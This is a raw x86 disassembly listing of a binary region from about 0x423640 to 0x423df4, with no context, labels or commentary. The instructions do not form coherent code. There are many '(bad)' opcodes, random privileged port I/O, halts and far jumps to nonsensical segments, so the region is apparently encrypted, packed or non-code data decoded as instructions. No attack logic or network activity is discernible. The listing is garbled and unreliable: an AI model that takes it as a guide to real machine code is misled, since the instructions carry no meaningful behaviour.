  423640:	and    DWORD PTR es:[ebx-0x69],esi
  423644:	sbb    ebp,DWORD PTR [ebp-0xb82889e]
  42364a:	mov    WORD PTR [edx+0x1f6eabe0],es
  423650:	push   0x9e71bb65
  423655:	mov    ecx,0xf74f4cbf
  42365a:	in     al,0xfe
  42365c:	into   
  42365d:	pop    ss
  42365e:	xor    edx,DWORD PTR [edi-0x1ba6baa0]
  423664:	xor    ebp,ebx
  423666:	and    ecx,DWORD PTR [ebx]
  423668:	lock out 0x96,eax
  42366b:	jmp    DWORD PTR [ecx+0x30851d08]
  423671:	adc    al,dl
  423673:	test   DWORD PTR [edx],esp
  423675:	hlt    
  423676:	cmp    esp,DWORD PTR [esi+0x13]
  423679:	outs   dx,DWORD PTR ds:[esi]
  42367a:	ror    DWORD PTR [eax+0x25],cl
  42367d:	lahf   
  42367e:	sbb    al,0x69
  423680:	dec    esi
  423681:	sbb    DWORD PTR [ebp+0x61c7816d],esi
  423687:	outs   dx,DWORD PTR ds:[esi]
  423688:	push   0x95403853
  42368d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42368e:	sbb    esp,edx
  423690:	dec    edi
  423691:	mov    dl,0xf5
  423693:	or     al,0x5a
  423695:	or     al,0xba
  423697:	div    bl
  423699:	loop   0x423719
  42369b:	mov    al,0xd6
  42369d:	cmc    
  42369e:	aam    0xbb
  4236a0:	jecxz  0x4236f0
  4236a2:	test   BYTE PTR [eax+edx*2-0x4f],0x38
  4236a7:	jecxz  0x42365f
  4236a9:	out    dx,eax
  4236aa:	in     eax,dx
  4236ab:	nop
  4236ac:	in     al,dx
  4236ad:	retf   
  4236ae:	pusha  
  4236af:	cmp    cl,bh
  4236b1:	(bad)  
  4236b2:	sbb    eax,0x27240d06
  4236b7:	sbb    eax,0x5fe86627
  4236bc:	enter  0xc9e1,0x41
  4236c0:	cmp    BYTE PTR [edx+0x3a],0x87
  4236c4:	(bad)  
  4236c5:	xchg   ecx,eax
  4236c6:	mov    cl,dh
  4236c8:	aam    0x5
  4236ca:	push   esi
  4236cb:	mov    ebx,0x5fcefd94
  4236d0:	ds (bad) 
  4236d2:	fsubrp st(6),st
  4236d4:	push   edi
  4236d5:	hlt    
  4236d6:	in     al,dx
  4236d7:	scas   al,BYTE PTR es:[edi]
  4236d8:	fwait
  4236d9:	out    0xbc,al
  4236db:	fwait
  4236dc:	cmp    DWORD PTR [ecx-0x1632803e],0x3537
	...
  4236ee:	add    BYTE PTR [eax],al
  4236f0:	add    BYTE PTR [esi+eiz*2],bl
  4236f3:	in     eax,0x66
  4236f5:	jmp    edi
  4236f7:	lahf   
  4236f8:	jle    0x42374a
  4236fa:	stos   BYTE PTR es:[edi],al
  4236fb:	xchg   BYTE PTR [eax-0x1a08816b],dh
  423701:	sbb    eax,0xab0001af
  423706:	add    eax,DWORD PTR [eax]
  423708:	add    dh,dh
  42370a:	add    BYTE PTR [edx+0x1e],dl
  42370d:	fcom   DWORD PTR [eax]
  42370f:	(bad)  
  423710:	mov    al,0x69
  423712:	iret   
  423713:	mov    edx,ebp
  423715:	xchg   ecx,eax
  423716:	retf   
  423717:	mov    eax,ds:0xd45f9341
  42371c:	jbe    0x42370a
  42371e:	rcl    DWORD PTR [ecx+0x7648809c],0x57
  423725:	stos   BYTE PTR es:[edi],al
  423726:	shl    BYTE PTR [ebx],0xc4
  423729:	and    DWORD PTR [ecx],0xffffffb4
  42372c:	sar    BYTE PTR [edi],1
  42372e:	je     0x4236e6
  423730:	daa    
  423731:	jl     0x42373e
  423733:	push   ecx
  423734:	add    ch,ah
  423736:	scas   eax,DWORD PTR es:[edi]
  423737:	nop
  423738:	fimul  WORD PTR [ecx-0x2837d5fb]
  42373e:	cwde   
  42373f:	push   ds
  423740:	inc    edi
  423741:	div    DWORD PTR [ebx]
  423743:	cmp    ebp,edi
  423745:	out    0x12,eax
  423747:	out    0x5b,al
  423749:	(bad)  
  42374b:	in     eax,dx
  42374c:	rol    BYTE PTR [ebp+0x759c5f40],1
  423752:	mov    WORD PTR [ecx-0x63e2e31c],?
  423758:	add    BYTE PTR [ecx-0x55128df9],bl
  42375e:	(bad)  
  42375f:	lea    edi,[eax-0x2ccda4e9]
  423765:	xchg   edi,eax
  423766:	mov    BYTE PTR [ecx+0x51],cl
  423769:	or     DWORD PTR [ebx],ebx
  42376b:	jns    0x42371e
  42376d:	xchg   BYTE PTR [ebp-0x20],bl
  423770:	sub    dh,bh
  423772:	dec    edi
  423773:	and    al,0x56
  423775:	and    BYTE PTR [ebx+esi*2+0x16],al
  423779:	sub    esi,DWORD PTR [ebx+edi*1]
  42377c:	sti    
  42377d:	inc    edx
  42377e:	xor    al,0xf5
  423780:	jmp    0x3a28aa40
  423785:	adc    DWORD PTR [ecx],ebx
  423787:	dec    ebp
  423788:	outs   dx,BYTE PTR ds:[esi]
  423789:	adc    DWORD PTR [edx-0x703db8af],esp
  42378f:	or     ebx,DWORD PTR [ecx*1-0x3d4ea0ba]
  423796:	lea    edi,[eax+0x70aa2f5]
  42379c:	cmp    eax,0xe54b57ef
  4237a1:	add    esi,edi
  4237a3:	repz sbb edi,ebx
  4237a6:	jl     0x423734
  4237a8:	fimul  DWORD PTR [edx]
  4237aa:	xchg   ebp,eax
  4237ab:	mov    WORD PTR [edx+0x1b],?
  4237ae:	pop    edi
  4237af:	adc    bl,BYTE PTR [eax+ebx*2+0x72]
  4237b3:	add    edi,DWORD PTR [edx+0x48d0d862]
  4237b9:	in     al,0x46
  4237bb:	es daa 
  4237bd:	xchg   ebp,eax
  4237be:	sar    DWORD PTR [edi],1
  4237c0:	repz pop ecx
  4237c2:	mov    dh,0xb
  4237c4:	mov    ecx,0xd497fe5d
  4237c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4237ca:	pop    es
  4237cb:	fnstsw WORD PTR [ebx+0x7c4bbaf4]
  4237d1:	in     al,0xb4
  4237d3:	dec    eax
  4237d4:	sub    DWORD PTR [edx-0x62befcbc],0x9cfd439b
  4237de:	push   edi
  4237df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4237e0:	adc    DWORD PTR [esi],0x72
  4237e3:	xchg   edi,eax
  4237e4:	stos   DWORD PTR es:[edi],eax
  4237e5:	push   ecx
  4237e6:	dec    esp
  4237e7:	and    DWORD PTR [eax-0x21],esi
  4237ea:	stos   DWORD PTR es:[edi],eax
  4237eb:	scas   al,BYTE PTR es:[edi]
  4237ec:	add    al,0x37
  4237ee:	xchg   edx,eax
  4237ef:	xchg   ebx,eax
  4237f0:	cmp    DWORD PTR [ecx-0x41ab2c75],ebp
  4237f6:	pop    eax
  4237f7:	push   es
  4237f8:	inc    edi
  4237f9:	rcr    BYTE PTR [ecx-0x25f71b78],0xc
  423800:	pop    eax
  423801:	mov    ah,0x62
  423803:	lds    edx,FWORD PTR [ebp+ebx*8+0x643ad310]
  42380a:	ret    
  42380b:	and    esi,DWORD PTR [edi+ebp*8+0x23]
  42380f:	jnp    0x423843
  423811:	mov    al,0x4
  423813:	enter  0x240a,0xfb
  423817:	sub    bh,bl
  423819:	and    BYTE PTR [ebp+ebp*1+0x217fb591],0xd2
  423821:	fdiv   QWORD PTR [esi+0x5df84598]
  423827:	sub    BYTE PTR [ebp+0x68],ch
  42382a:	mov    al,0x49
  42382c:	test   BYTE PTR [edi-0x12],dl
  42382f:	inc    ebx
  423830:	xor    ebp,ecx
  423832:	mov    dl,0x36
  423834:	push   eax
  423835:	lahf   
  423836:	out    0x4d,eax
  423838:	aam    0x98
  42383a:	or     eax,0x147acd20
  42383f:	dec    ebp
  423840:	pop    edx
  423841:	scas   al,BYTE PTR es:[edi]
  423842:	cwde   
  423843:	mov    ebp,0xaa34448c
  423848:	jae    0x423889
  42384a:	dec    esp
  42384b:	loopne 0x423848
  42384d:	es push ecx
  42384f:	jns    0x423830
  423851:	sbb    DWORD PTR [eax-0x2e938004],edi
  423857:	jne    0x42383b
  423859:	sub    bl,BYTE PTR [edi]
  42385b:	lahf   
  42385c:	iret   
  42385d:	ja     0x4238bf
  42385f:	sti    
  423860:	push   ds
  423861:	xor    eax,0xfca244e0
  423866:	pop    es
  423867:	dec    ebp
  423868:	mov    edi,0xc04ab865
  42386d:	sbb    eax,0x8bdda43f
  423872:	jg     0x4238e8
  423874:	push   edi
  423875:	push   0x17ffd0a5
  42387a:	inc    ebx
  42387b:	xchg   ecx,eax
  42387c:	jecxz  0x423859
  42387e:	xchg   ecx,eax
  42387f:	enter  0x7d29,0x6d
  423883:	dec    esp
  423884:	adc    al,0x49
  423886:	jmp    0x423861
  423888:	push   edx
  423889:	and    BYTE PTR [edi+0x1943b6eb],dh
  42388f:	or     BYTE PTR [esp+ebx*8],ah
  423892:	psraw  mm6,QWORD PTR [edi+0x36]
  423896:	jbe    0x4238d8
  423898:	lods   al,BYTE PTR ds:[esi]
  423899:	loope  0x42382e
  42389b:	xor    ebx,DWORD PTR [ebx+edi*2-0x57]
  42389f:	ret    0x40fc
  4238a2:	shr    edi,0x69
  4238a5:	pop    eax
  4238a6:	and    DWORD PTR [ecx-0x19],edi
  4238a9:	mov    dh,0xb4
  4238ab:	add    bh,al
  4238ad:	dec    ebx
  4238ae:	pop    es
  4238af:	push   ecx
  4238b0:	les    edx,FWORD PTR [edx+0x5279fff2]
  4238b6:	cs repnz loop 0x423871
  4238ba:	or     BYTE PTR [ecx+0x17c638d1],bh
  4238c0:	pop    esp
  4238c1:	and    DWORD PTR [esp+ecx*1+0xb],ebp
  4238c5:	call   0xf2f8a0e4
  4238ca:	(bad)  
  4238cb:	jge    0x423894
  4238cd:	push   esp
  4238ce:	fdivr  QWORD PTR [ebx]
  4238d0:	repz pop edi
  4238d2:	xchg   ebx,eax
  4238d3:	ins    DWORD PTR es:[edi],dx
  4238d4:	aas    
  4238d5:	cmp    BYTE PTR ds:0xab1c7ce1,bl
  4238db:	(bad)  
  4238dd:	cmp    esi,DWORD PTR [esi+ecx*8-0x79d15da2]
  4238e4:	in     eax,0x99
  4238e6:	pop    ds
  4238e7:	lods   al,BYTE PTR ds:[esi]
  4238e8:	in     al,0x9c
  4238ea:	xchg   BYTE PTR [edi],cl
  4238ec:	cmp    al,dl
  4238ee:	sbb    ebx,0xffffffa2
  4238f1:	setae  dl
  4238f4:	stc    
  4238f5:	stos   DWORD PTR es:[edi],eax
  4238f6:	stos   DWORD PTR es:[edi],eax
  4238f7:	aam    0x95
  4238f9:	and    eax,0x7f926b39
  4238fe:	fs call 0x5d5fd96f
  423904:	lds    eax,FWORD PTR [ecx]
  423906:	adc    al,0xc
  423908:	repz jmp 0x42388b
  42390b:	arpl   WORD PTR [ecx-0x14c487a3],dx
  423911:	add    esi,edi
  423913:	pop    es
  423914:	call   0x54dc7542
  423919:	in     eax,0x87
  42391b:	dec    ecx
  42391c:	sbb    al,0x3
  42391e:	cs sahf 
  423920:	mov    ds:0x1a35f014,eax
  423925:	mov    ah,0xf1
  423927:	and    cl,BYTE PTR [edi-0x7de1217e]
  42392d:	daa    
  42392e:	lahf   
  42392f:	clc    
  423930:	mov    eax,DWORD PTR [esi+0x58]
  423933:	stos   DWORD PTR es:[edi],eax
  423934:	stc    
  423935:	arpl   WORD PTR [edx-0x6b2a842d],di
  42393b:	mov    bl,BYTE PTR [ebx]
  42393d:	xor    eax,0x97ebf02d
  423942:	add    DWORD PTR [esi],ebx
  423944:	sbb    al,0x51
  423946:	xchg   BYTE PTR [ebp*4+0x27336a3f],al
  42394d:	xor    cl,BYTE PTR [ebp+0x66]
  423950:	es shr ah,0xc6
  423954:	xchg   ecx,eax
  423955:	mov    bl,0x1c
  423957:	sub    al,0xc3
  423959:	add    cl,bl
  42395b:	sub    al,0x2f
  42395d:	aad    0x1
  42395f:	jno    0x4239c4
  423961:	repz aam 0x97
  423964:	outs   dx,DWORD PTR ds:[esi]
  423965:	(bad)  
  423966:	pop    esi
  423967:	stos   DWORD PTR es:[edi],eax
  423968:	ficom  WORD PTR [eax+ebx*1]
  42396b:	add    edx,eax
  42396d:	push   esp
  42396e:	nop
  42396f:	(bad)  
  423970:	mov    ah,BYTE PTR [edx+0x3bcb824]
  423976:	test   BYTE PTR [eax+esi*8-0x4178547e],0x12
  42397e:	dec    esi
  42397f:	inc    esp
  423980:	mov    bl,0x38
  423982:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423983:	dec    ecx
  423984:	in     eax,0xae
  423986:	mov    al,ds:0x78d8f4e0
  42398b:	jp     0x4239cf
  42398d:	pop    ecx
  42398e:	cld    
  42398f:	push   esp
  423990:	adc    ch,BYTE PTR [ebp+ebx*4-0xb119056]
  423997:	jle    0x42398b
  423999:	dec    esi
  42399a:	jbe    0x423932
  42399c:	lds    edi,FWORD PTR [ebx+0x3236b242]
  4239a2:	outs   dx,DWORD PTR ds:[esi]
  4239a3:	daa    
  4239a4:	mul    DWORD PTR [ebx-0x2]
  4239a7:	and    edi,DWORD PTR [ebx+0x72958c20]
  4239ad:	lods   al,BYTE PTR ds:[esi]
  4239ae:	mov    ds:0xac49cb46,eax
  4239b3:	nop
  4239b4:	lods   al,BYTE PTR ds:[esi]
  4239b5:	inc    esi
  4239b6:	pop    ds
  4239b7:	jp     0x4239fa
  4239b9:	test   eax,0xe12ab822
  4239be:	retf   0x9033
  4239c1:	pusha  
  4239c2:	or     DWORD PTR [ebx],esi
  4239c4:	rol    BYTE PTR [esi-0x59],0xc4
  4239c8:	cmp    dh,BYTE PTR [edi+edi*8-0x50]
  4239cc:	adc    al,0x43
  4239ce:	push   0x77
  4239d0:	adc    edi,DWORD PTR [esi]
  4239d2:	mov    dh,0xdb
  4239d4:	dec    esi
  4239d5:	loopne 0x4239ad
  4239d7:	les    edi,FWORD PTR ds:0x43eeb4bf
  4239dd:	(bad)  
  4239de:	je     0x42398d
  4239e0:	push   esi
  4239e1:	lock mov ecx,0xa941f24f
  4239e7:	mov    ch,BYTE PTR [ebx+0x60f1fbe2]
  4239ed:	cld    
  4239ee:	repz mov dl,0x71
  4239f1:	in     eax,0x55
  4239f3:	fld    QWORD PTR [ebx-0x74ec1ad]
  4239f9:	addr16 ret 
  4239fb:	jmp    0xce72:0x3023b779
  423a02:	cli    
  423a03:	cmp    al,0xb0
  423a05:	sbb    bl,ah
  423a07:	pop    eax
  423a08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423a09:	mov    eax,0xc390cbff
  423a0e:	xchg   esi,eax
  423a0f:	push   0x765ff102
  423a14:	icebp  
  423a15:	(bad)  
  423a17:	in     al,0x65
  423a19:	sbb    BYTE PTR [esp+ecx*1-0x3f227a60],ah
  423a20:	ja     0x423a1b
  423a22:	cli    
  423a23:	fcomp  QWORD PTR [eax+ebp*8+0x43f8759e]
  423a2a:	adc    DWORD PTR [edx],eax
  423a2c:	xchg   ebp,eax
  423a2d:	and    esi,edi
  423a2f:	pop    esi
  423a30:	mov    ecx,DWORD PTR [ebx+0x52]
  423a33:	push   ds
  423a34:	xchg   edx,eax
  423a35:	or     eax,ecx
  423a37:	xchg   edx,eax
  423a38:	ret    
  423a39:	xor    BYTE PTR [ebp-0x1946285f],dh
  423a3f:	fwait
  423a40:	sbb    al,0x1f
  423a42:	shl    BYTE PTR [edi],1
  423a44:	xlat   BYTE PTR ds:[ebx]
  423a45:	pop    esi
  423a46:	mov    ds:0x27ec99d,al
  423a4b:	cs jmp 0x2ece:0xd1bda806
  423a53:	xor    DWORD PTR [eax],edi
  423a55:	shl    BYTE PTR [edx+0x5debf9c3],0xb9
  423a5c:	outs   dx,BYTE PTR ds:[esi]
  423a5d:	outs   dx,DWORD PTR ds:[esi]
  423a5e:	mov    ds:0x99b54874,eax
  423a63:	push   es
  423a64:	ins    BYTE PTR es:[edi],dx
  423a65:	pop    edi
  423a66:	cmc    
  423a67:	jne    0x423ac7
  423a69:	lods   al,BYTE PTR ds:[esi]
  423a6a:	std    
  423a6b:	ret    
  423a6c:	adc    edi,edx
  423a6e:	jge    0x4239fb
  423a70:	inc    edi
  423a71:	mov    DWORD PTR [eax-0x34daf41f],esp
  423a77:	jnp    0x423a91
  423a79:	cmc    
  423a7a:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  423a7c:	cli    
  423a7d:	ins    BYTE PTR es:[edi],dx
  423a7e:	and    BYTE PTR [esi],cl
  423a80:	mov    ds:0x8d6bc0a6,al
  423a85:	dec    bh
  423a87:	push   esp
  423a88:	jnp    0x423a20
  423a8a:	ret    0x229d
  423a8d:	xchg   BYTE PTR [ebp+eiz*2-0x3c],cl
  423a91:	xchg   ebp,eax
  423a92:	xor    ebx,DWORD PTR [ecx-0x4d]
  423a95:	xor    edx,edx
  423a97:	mov    ds:0x147be93a,eax
  423a9c:	mov    DWORD PTR [eax-0x1b],edi
  423a9f:	pusha  
  423aa0:	cmpps  xmm7,XMMWORD PTR [esi+0x3a4ed6e6],0x64
  423aa8:	jne    0x423a30
  423aaa:	pop    ss
  423aab:	(bad)  
  423aac:	retf   
  423aad:	or     BYTE PTR ds:0xd0659791,bh
  423ab3:	or     al,0x0
	...
  423ac1:	dec    ecx
  423ac2:	cli    
  423ac3:	mov    ebx,0xfd4fbb4e
  423ac8:	dec    DWORD PTR [ecx]
  423aca:	mov    WORD PTR ds:[edi-0x6a],cs
  423ace:	int    0x60
  423ad0:	or     eax,ecx
  423ad2:	mov    dl,0x1
  423ad4:	add    BYTE PTR [ebx-0x45fffffd],ch
  423ada:	cli    
  423adb:	movhps xmm6,QWORD PTR [edx+0x1c]
  423adf:	scas   al,BYTE PTR es:[edi]
  423ae0:	sub    dl,BYTE PTR [esi]
  423ae2:	imul   ecx,DWORD PTR [ecx+0x57],0x1885dfc2
  423ae9:	std    
  423aea:	mov    al,0xc0
  423aec:	mov    cl,0x47
  423aee:	sub    DWORD PTR ds:0x217f1df2,esi
  423af4:	sub    bl,BYTE PTR [ebp+0x2c]
  423af7:	pop    eax
  423af8:	inc    edi
  423af9:	test   BYTE PTR [edx-0x4b],bh
  423afc:	or     ah,BYTE PTR [ecx-0x4c]
  423aff:	loop   0x423acc
  423b01:	dec    edi
  423b02:	hlt    
  423b03:	arpl   WORD PTR [esi],cx
  423b05:	adc    BYTE PTR [edi+0x67],cl
  423b08:	xor    BYTE PTR [edi-0x6a],0xb3
  423b0c:	push   ebp
  423b0d:	fcmovnbe st,st(1)
  423b0f:	into   
  423b10:	jecxz  0x423b3c
  423b12:	jb     0x423b07
  423b14:	jmp    0x423af1
  423b16:	int3   
  423b17:	and    BYTE PTR [esi-0x13],ch
  423b1a:	outs   dx,BYTE PTR ds:[esi]
  423b1b:	ins    DWORD PTR es:[edi],dx
  423b1c:	cld    
  423b1d:	ret    0x7bd
  423b20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423b21:	push   edi
  423b22:	cmp    DWORD PTR [eax-0x18b9ecd8],0xb796d66a
  423b2c:	icebp  
  423b2d:	xchg   ebx,eax
  423b2e:	in     eax,0x93
  423b30:	ja     0x423b1d
  423b32:	retf   
  423b33:	xchg   ecx,eax
  423b34:	sbb    eax,0x5ddbd1c5
  423b39:	ja     0x423b89
  423b3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423b3c:	mov    ah,0x60
  423b3e:	push   0x3e
  423b40:	mov    esp,0xc6f572c3
  423b45:	fild   DWORD PTR [edx-0x5808081f]
  423b4b:	scas   al,BYTE PTR es:[edi]
  423b4c:	add    ebx,DWORD PTR [ecx-0x2e]
  423b4f:	sub    dh,dl
  423b51:	pop    ebx
  423b52:	or     eax,0x85be4edb
  423b57:	mov    ds:0x854a19c5,al
  423b5c:	fs adc al,0xce
  423b5f:	clc    
  423b60:	mov    WORD PTR ds:0xff88d69b,?
  423b66:	mov    ds:0xe59c84f4,al
  423b6b:	imul   ecx,DWORD PTR [ebx-0x1],0xffffffa3
  423b6f:	aam    0x12
  423b71:	adc    eax,DWORD PTR [eax+0x78]
  423b74:	mov    edi,0x7e922edd
  423b79:	retf   0x1cb5
  423b7c:	jae    0x423b2c
  423b7e:	push   ss
  423b7f:	push   ss
  423b80:	fwait
  423b81:	sub    al,0x36
  423b83:	and    DWORD PTR [esi+0x6d],esp
  423b86:	jmp    0x2f2c:0xf2d7906
  423b8d:	aam    0xa8
  423b8f:	enter  0xf95b,0x6e
  423b93:	push   edx
  423b94:	in     eax,dx
  423b95:	test   BYTE PTR [ecx-0x57a232f5],dh
  423b9b:	(bad)  
  423b9c:	jo     0x423bf2
  423b9e:	sar    edx,1
  423ba0:	fstp   QWORD PTR [edi-0x5e7493d9]
  423ba6:	ins    DWORD PTR es:[edi],dx
  423ba7:	or     bl,BYTE PTR [edi]
  423ba9:	mov    esp,0xaa3e0b7b
  423bae:	jne    0x423bd6
  423bb0:	fs scas eax,DWORD PTR es:[edi]
  423bb2:	pop    esp
  423bb3:	and    DWORD PTR [ecx-0x55],esp
  423bb6:	xor    al,0x48
  423bb8:	cmp    DWORD PTR [ecx+0x2fd17645],edi
  423bbe:	mov    ds:0xf6e71295,al
  423bc3:	cdq    
  423bc4:	and    eax,0xce9d24bb
  423bc9:	lods   al,BYTE PTR ds:[esi]
  423bca:	sub    BYTE PTR [ebp+0x27],ch
  423bcd:	sub    esi,DWORD PTR [ebx]
  423bcf:	mov    bh,0x56
  423bd1:	pop    ss
  423bd2:	rcl    DWORD PTR [edx],cl
  423bd4:	mov    WORD PTR [esi+0x6e334ba],fs
  423bda:	mov    dh,BYTE PTR [ebp-0x67]
  423bdd:	aam    0x57
  423bdf:	(bad)
  423be2:	dec    esp
  423be3:	push   ebx
  423be4:	bound  ebx,QWORD PTR [ebx+0x1c]
  423be7:	inc    eax
  423be8:	bound  esi,QWORD PTR [esp+edx*1+0x7555f9bd]
  423bef:	jne    0x423bb8
  423bf1:	addr16 jmp 0x423c02
  423bf4:	push   cs
  423bf5:	imul   edi,DWORD PTR [esi],0xffffffd0
  423bf8:	clc    
  423bf9:	sub    DWORD PTR [edi-0x48],0xeb5cf028
  423c00:	and    al,0x24
  423c02:	xor    edx,DWORD PTR [esi+0x74dd9ab]
  423c08:	leave  
  423c09:	mov    eax,0xb72bff30
  423c0f:	sub    esp,DWORD PTR [esi-0x35faeaa3]
  423c15:	adc    DWORD PTR [eax+0x32035728],0xfffffff6
  423c1c:	shr    DWORD PTR [edx],cl
  423c1e:	jp     0x423bf0
  423c20:	mov    ch,dh
  423c22:	cmp    eax,0x6713c6e6
  423c27:	or     bl,ch
  423c29:	mov    al,ds:0x4704232d
  423c2e:	cmp    DWORD PTR [ebx+edx*4-0x74cd7c9b],0x68
  423c36:	jmp    0x54b76e37
  423c3b:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  423c3d:	jp     0x423c6e
  423c3f:	sti    
  423c40:	fwait
  423c41:	leave  
  423c42:	xchg   edi,eax
  423c43:	cli    
  423c44:	imul   esp,DWORD PTR [edx],0x58
  423c47:	ja     0x423c9b
  423c49:	sub    ch,bh
  423c4b:	cmp    edi,DWORD PTR [edx+0x5a61d0c1]
  423c51:	sbb    edi,DWORD PTR [ebx+0x51]
  423c54:	scas   eax,DWORD PTR es:[edi]
  423c55:	fbld   TBYTE PTR [ebx-0x5b]
  423c58:	inc    ebx
  423c59:	inc    ecx
  423c5a:	push   ecx
  423c5b:	jae    0x423c9a
  423c5d:	inc    edx
  423c5e:	scas   al,BYTE PTR es:[edi]
  423c5f:	shl    edi,cl
  423c61:	pop    edx
  423c62:	outs   dx,DWORD PTR ds:[esi]
  423c63:	dec    ebx
  423c64:	sbb    dl,0x1f
  423c67:	mov    ds:0x1328609e,eax
  423c6c:	pop    ds
  423c6d:	push   0xffffffc4
  423c6f:	repz (bad) 
  423c71:	xchg   esi,eax
  423c72:	es sbb eax,0x9733a488
  423c78:	inc    edx
  423c79:	sub    DWORD PTR [ebp-0x30a5bd42],esp
  423c7f:	mov    ecx,0xd2741819
  423c84:	sbb    al,0xbf
  423c86:	aaa    
  423c87:	xchg   DWORD PTR [eax],ecx
  423c89:	in     al,0x3c
  423c8b:	out    0xda,eax
  423c8d:	push   ecx
  423c8e:	stos   DWORD PTR es:[edi],eax
  423c8f:	mov    eax,ds:0x2edfbe4f
  423c94:	inc    ebp
  423c95:	adc    dl,BYTE PTR [ecx+0x3c]
  423c98:	jno    0x423cbc
  423c9a:	fsubr  DWORD PTR [eax]
  423c9c:	add    esi,DWORD PTR [esi+edx*4-0x6509b7db]
  423ca3:	pop    edx
  423ca4:	adc    DWORD PTR [ebp+0x7f],ecx
  423ca7:	mov    BYTE PTR [eax],ah
  423ca9:	icebp  
  423caa:	cmc    
  423cab:	fisubr DWORD PTR [eax+0x6e]
  423cae:	das    
  423caf:	sub    dh,dl
  423cb1:	(bad)  
  423cb2:	mov    ss:0x4ef53c60,eax
  423cb8:	ret    
  423cb9:	xchg   esp,eax
  423cba:	test   DWORD PTR [bx-0x6d],ebx
  423cbe:	ja     0x423c87
  423cc0:	inc    ebx
  423cc1:	fisubr DWORD PTR [eax]
  423cc3:	push   ebx
  423cc4:	(bad)  
  423cc5:	pop    ecx
  423cc6:	mov    cl,0x70
  423cc8:	mov    DWORD PTR [ecx-0x64],edx
  423ccb:	fst    DWORD PTR [ebp+ebp*8+0x52]
  423ccf:	cdq    
  423cd0:	mov    edx,0x583af187
  423cd5:	inc    esp
  423cd6:	sbb    eax,0xb33f5c74
  423cdb:	mov    dh,BYTE PTR [edi+0x14]
  423cde:	mov    dl,0x1a
  423ce0:	cs jb  0x423c85
  423ce3:	push   esp
  423ce4:	scas   eax,DWORD PTR es:[edi]
  423ce5:	leave  
  423ce6:	out    0xf3,eax
  423ce8:	into   
  423ce9:	mov    edi,0x7fef12bd
  423cee:	xor    al,0x67
  423cf0:	xchg   ebp,eax
  423cf1:	push   ecx
  423cf2:	fstp   DWORD PTR [eax]
  423cf4:	outs   dx,BYTE PTR ds:[esi]
  423cf5:	jb     0x423ccf
  423cf7:	stc    
  423cf8:	imul   edi,esi,0x11
  423cfb:	pop    ebp
  423cfc:	dec    esi
  423cfd:	std    
  423cfe:	js     0x423c95
  423d00:	mov    ds:0x20d2abe5,eax
  423d05:	shr    DWORD PTR [esi],1
  423d07:	fisub  DWORD PTR [edi+eiz*1+0x64f42d49]
  423d0e:	xchg   edi,eax
  423d0f:	push   edi
  423d10:	sub    eax,0xe0e48aba
  423d15:	cmp    BYTE PTR [edx],al
  423d17:	xchg   ecx,eax
  423d18:	aad    0xd8
  423d1a:	ret    0x256
  423d1d:	cmp    ebp,DWORD PTR [edx]
  423d1f:	sbb    ah,BYTE PTR [edx-0x5e]
  423d22:	jno    0x423cbd
  423d24:	test   BYTE PTR [ecx+0x20b6fa3d],0x8d
  423d2b:	out    0x70,al
  423d2d:	or     BYTE PTR [ebp+0x5514b7b6],ah
  423d33:	pop    esi
  423d34:	xor    eax,0x46bd2887
  423d39:	leave  
  423d3a:	int    0xa5
  423d3c:	adc    DWORD PTR [edx],esi
  423d3e:	popa   
  423d3f:	pop    eax
  423d40:	shl    DWORD PTR [esi],1
  423d42:	lds    edx,FWORD PTR [esi]
  423d44:	mov    eax,ds:0x969e3378
  423d49:	or     esp,ebp
  423d4b:	cmc    
  423d4c:	into   
  423d4d:	ins    BYTE PTR es:[edi],dx
  423d4e:	sbb    eax,0x6343a036
  423d53:	push   edi
  423d54:	jecxz  0x423dbc
  423d56:	mov    edi,0x4c2b9936
  423d5b:	hlt    
  423d5c:	ins    BYTE PTR es:[edi],dx
  423d5d:	fist   DWORD PTR [edi-0x48]
  423d60:	mov    ds,WORD PTR [ebp+0x6c792bfa]
  423d66:	aam    0x7e
  423d68:	cmp    al,0x4a
  423d6a:	add    eax,0x1c0b8597
  423d6f:	loopne 0x423cfc
  423d71:	outs   dx,BYTE PTR ds:[esi]
  423d72:	ja     0x423d6b
  423d74:	iret   
  423d75:	repz out dx,al
  423d77:	mov    esp,0x1c388cd6
  423d7c:	int3   
  423d7d:	repnz out 0x7b,eax
  423d80:	jge    0x423d57
  423d82:	jp     0x423deb
  423d84:	stos   DWORD PTR es:[edi],eax
  423d85:	mov    edx,0x41d313c6
  423d8a:	mov    bl,0x92
  423d8c:	dec    edi
  423d8d:	lods   al,BYTE PTR ds:[esi]
  423d8e:	mov    cl,0x1e
  423d90:	out    dx,al
  423d91:	nop
  423d92:	ds test eax,0xc46f7406
  423d98:	stos   DWORD PTR es:[edi],eax
  423d99:	sbb    BYTE PTR [edi-0x27519b25],dh
  423d9f:	dec    edi
  423da0:	mov    edi,0xe52bea61
  423da5:	mov    cl,0x20
  423da7:	jo     0x423e0c
  423da9:	mov    bh,0x95
  423dab:	sbb    cl,BYTE PTR [ebp-0x28]
  423dae:	ins    BYTE PTR es:[edi],dx
  423daf:	ss dec edi
  423db1:	dec    edx
  423db2:	std    
  423db3:	ficom  WORD PTR [ecx-0x7f]
  423db6:	dec    edx
  423db7:	jbe    0x423d7f
  423db9:	push   0x52
  423dbb:	cmp    bl,BYTE PTR [esi]
  423dbd:	aaa    
  423dbe:	dec    esi
  423dbf:	jns    0x423de9
  423dc1:	cdq    
  423dc2:	mov    edi,0x153ab63d
  423dc7:	xor    eax,0x499ebbd5
  423dcc:	pusha  
  423dcd:	push   ds
  423dce:	les    edx,FWORD PTR [ebx+eax*4+0x7e2eac5]
  423dd5:	cs in  eax,dx
  423dd7:	mov    ecx,0x668348df
  423ddc:	adc    eax,0x180da7b9
  423de1:	ret    
  423de2:	es int3 
  423de4:	mov    ah,0x21
  423de6:	pop    esp
  423de7:	scas   eax,DWORD PTR es:[edi]
  423de8:	jno    0x423dd2
  423dea:	gs pop eax
  423dec:	call   0xa443:0xb073
  423df2:	out    0xb6,al
  423df4:	mov    eax,ds:0xe11ef93c
